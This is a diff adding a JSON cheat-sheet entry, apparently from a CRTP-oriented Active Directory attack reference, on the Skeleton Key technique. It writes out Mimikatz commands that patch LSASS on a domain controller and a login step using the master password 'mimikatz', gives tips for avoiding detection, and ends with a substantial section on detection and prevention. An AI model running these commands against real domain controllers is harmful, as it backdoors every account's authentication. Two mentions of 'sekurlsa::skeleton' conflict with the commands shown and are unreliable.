@@ -1,0 +1,96 @@
+{
+  "id": "crtp-skeleton-key",
+  "name": "Skeleton Key (LSASS Patch on DC)",
+  "command": "Invoke-Mimikatz -Command '\"misc::skeleton\"' -ComputerName <dc_host>",
+  "description": "Patch LSASS on a DC to install a master password ('mimikatz') that works for all accounts alongside their real passwords. Does NOT survive reboot.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "loud",
+  "mitre": [
+    "T1556.001"
+  ],
+  "tools": [
+    "SafetyKatz"
+  ],
+  "tags": [
+    "skeleton-key",
+    "persistence",
+    "lsass-patch",
+    "da-required",
+    "non-persistent"
+  ],
+  "steps": [
+    {
+      "label": "Inject skeleton key on DC (requires DA + SYSTEM on DC)",
+      "command": "Invoke-Mimikatz -Command '\"misc::skeleton\"' -ComputerName <dc_host>"
+    },
+    {
+      "label": "Authenticate as any user with skeleton key",
+      "command": "Enter-PSSession -ComputerName <dc_host> -Credential <domain>\\Administrator\n# Password: mimikatz"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Inject on DC01",
+      "command": "Invoke-Mimikatz -Command '\"misc::skeleton\"' -ComputerName DC01.corp.local"
+    },
+    {
+      "label": "Auth as admin using skeleton key",
+      "command": "Enter-PSSession -ComputerName DC01 -Credential corp\\Administrator\n# When prompted for password: mimikatz"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Persistent alternative — survives reboot",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-dsrm-backdoor",
+      "note": "DSRM backdoor persists across reboots",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "More stealthy alternative for ongoing access",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-silver-ticket",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "notes": "Does NOT survive a DC reboot. Requires DA and SYSTEM on DC. Detectable by LSA protection monitoring. Use in labs only.",
+  "references": [
+    {
+      "title": "CRTP - Skeleton Key",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - Skeleton Key",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Skeleton Key patches the LSASS process on a Domain Controller to inject a master password ('mimikatz' by default) that works for ANY user account in addition to their real password. The patch modifies the Kerberos RC4/DES authentication handler in memory so that both the real password and the skeleton key produce valid authentication. This requires DA and code execution on the DC, and the patch persists only until the DC reboots.",
+    "prerequisites": "Domain Admin rights. Code execution on a Domain Controller. Mimikatz with sekurlsa::skeleton command. LSASS must be running without PPL on the DC.",
+    "impact": "T1556.001 Modify Authentication Process: Domain Controller Authentication. Single password that authenticates as any user — stealthy for targeted use (IT admins logging in as different users, pivoting). Does not survive DC reboot (non-persistent, but reboots are rare in production). Works for NTLM and Kerberos authentication.",
+    "detection": "Sysmon Event 10: process access to lsass.exe from non-SYSTEM process on the DC. Event 4688: Mimikatz process on DC. Event 4624: successful logon for multiple user accounts with the same source IP from an admin host (same master password used for many accounts). MDI: 'Skeleton Key malware attack' — MDI specifically detects this pattern. DC LSASS memory integrity check (Defender ATP/EDR on DC).\nModification of LSASS and authentication DLLs, suspicious Registry changes to password filter packages, and abnormal process access to lsass.exe (DET0104/AN0287). Modification of PAM configuration files (/etc/pam.d/), unauthorized new PAM modules, suspicious processes accessing PAM-related binaries (AN0288). Unauthorized additions/changes to /Library/Security/SecurityAgentPlugins and suspicious processes hooking authentication APIs (AN0289). Suspicious changes to IdP authentication flows: enabling reversible password encryption, MFA bypass, or policy weakening (AN0290). Unauthorized IAM authentication configuration changes: disabling MFA, creating backdoor access keys, or altering trust policies (AN0291).",
+    "artifacts": "Sysmon Event 10: lsass.exe accessed on DC by admin process | Event 4624: multiple user logons from same IP with same timing pattern | MDI: 'Skeleton Key' alert | EDR: LSASS memory injection detected | Event 4688: Mimikatz on DC",
+    "prevention": "Enable LSASS PPL (RunAsPPL) on DCs — prevents the memory patching. Deploy EDR on DCs (CrowdStrike, Defender for Endpoint) with LSASS injection detection. MDI deployment. Restrict DC logon to DA accounts only from PAWs. Implement DC integrity monitoring. Reboot DCs regularly during maintenance to clear in-memory patches.\nAudit: Review authentication logs to ensure MFA enforcement is functioning; review hybrid identity solutions for discrepancies; check AD FS DLLs and executables for valid Microsoft signatures; review Registry for unknown network provider DLLs.\nMulti-factor Authentication: Integrate MFA to greatly reduce risk of adversary gaining control of valid credentials.\nOperating System Configuration: Ensure only valid password filters are registered in C:\\Windows\\System32\\ with corresponding Registry entries; disable EnableMPRNotifications policy (Windows 11 22H2+).\nPassword Policies: Ensure AllowReversiblePasswordEncryption is disabled unless required.\nPrivileged Account Management: Audit domain/local accounts and permission levels; limit access to root and protected components; limit on-premises accounts with hybrid identity access.\nPrivileged Process Integrity: Enable Protected Process Light (PPL) for LSA.\nRestrict File and Directory Permissions: Restrict write access to /Library/Security/SecurityAgentPlugins.\nRestrict Registry Permissions: Restrict modification of HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order.\nUser Account Management: Ensure secure policies for MFA enrollment and deactivation.",
+    "evasion": "Skeleton Key is in-memory only — clears on reboot. Use the injected master password sparingly (only for specific lateral movement) to avoid the 'same IP, multiple accounts' pattern. Only applicable if LSASS PPL is disabled.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1556/001/"
+    ],
+    "misconfiguration": "LSASS PPL disabled on DCs (common on older DCs — PPL requires Secure Boot or explicit configuration). EDR not deployed on DCs. MDI not deployed. DCs not rebooted regularly (patch persists longer).",
+    "vulnerable_config": "# LSASS PPL disabled on DC:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RunAsPPL\n# Returns $null or 0 = PPL NOT enabled on DC = LSASS patchable\n\n# EDR absent on DC:\n# Get-Service CsFalconService,MDEClient  # Not found = no EDR on DC\n\n# Result: Skeleton Key injected via Mimikatz:\n# sekurlsa::skeleton\n# DC LSASS patched — password 'mimikatz' now works for all domain users",
+    "secure_config": "# Enable LSASS PPL on DCs:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1\n# With Secure Boot: Set RunAsPPLBoot = 1 in addition\n\n# Via GPO:\n# Computer Config → Admin Templates → MS Security Guide\n# → Configure LSASS to run as a protected process: Enabled\n\n# Deploy MDI on all DCs:\n# MDI 'Skeleton Key malware attack' detection is built-in\n\n# Deploy EDR (Defender for Endpoint) on DCs:\n# LSASS Memory → PsProtectedSignerWindows-Light verification\n\n# Sysmon Rule on DCs:\n# <ProcessAccess onmatch='include'>\n#   <TargetImage condition='is'>C:\\Windows\\System32\\lsass.exe</TargetImage>\n# </ProcessAccess>"
+  }
+}
